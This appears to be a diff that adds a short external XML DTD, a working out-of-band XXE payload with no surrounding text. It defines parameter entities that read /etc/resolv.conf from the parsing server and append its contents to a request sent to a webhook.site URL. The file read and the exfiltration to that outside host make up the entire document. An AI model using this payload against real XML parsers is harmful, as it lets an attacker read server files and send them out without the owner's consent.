@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/resolv.conf">
+<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'https://webhook.site/a898f892-ba03-407b-b4ae-f4cb69d75d1a?leak=%file;'>">
+%eval;
+%send;
